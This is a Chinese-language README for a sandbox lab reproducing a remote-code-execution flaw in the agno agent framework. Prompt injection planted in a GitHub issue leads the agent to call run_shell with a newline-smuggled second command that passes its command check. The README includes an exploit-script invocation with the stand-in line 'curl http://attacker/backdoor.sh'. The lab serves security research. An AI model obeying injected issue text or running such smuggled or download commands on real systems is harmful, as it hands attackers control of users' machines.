# agno RCE 漏洞 — 沙箱复现实验环境

模拟真实攻击场景：AI agent 分析 GitHub Issue 时被 prompt injection + 换行符绕过 → RCE。

## 环境要求

- **一台能访问 OpenAI API 的机器**（或者配置了代理）
- **Docker + Docker Compose**（或直接用 Python）
- **OPENAI_API_KEY**

## 快速启动

```bash
# 1. 设置 API key
export OPENAI_API_KEY="sk-..."

# 2. 启动服务
docker-compose up --build
```

浏览器打开 http://localhost:8000

## 攻击步骤

### 方法 A：通过 Web 页面手动测试

1. 打开 http://localhost:8000
2. 把 `attack/exploit.py` 中的 PAYLOAD 复制到文本框
3. 点击提交
4. 观察是否出现 🚩「FLAG 文件已创建 — RCE 成功！」

### 方法 B：自动攻击脚本

```bash
# 在另一个终端运行
pip install requests
python3 attack/exploit.py

# 自定义命令
python3 attack/exploit.py http://localhost:8000 "curl http://attacker/backdoor.sh"
```

## 攻击原理

```
攻击者                     用户                       agno服务
  │                         │                          │
  ├─ 在 GitHub Issue 中 ───→│                          │
  │  植入 prompt injection  │                          │
  │                         ├─ "分析这个 issue" ──────→│
  │                         │                          ├─ LLM 被注入
  │                         │                          ├─ 调用 run_shell(
  │                         │                          │    "echo hello
  │                         │                          │     \npython3 -c ..."  )
  │                         │                          ├─ _check_command 通过 ✓
  │                         │                          ├─ subprocess.run(
  │                         │                          │    shell=True) → RCE!
  │                         │                          └─ 返回结果 ←── FLAG.txt
```

## 事后清理

```bash
docker-compose down -v
```

---

> ⚠️ 本实验环境包含已知漏洞，仅用于安全研究和教育目的。
> 不要暴露到公网或生产环境。
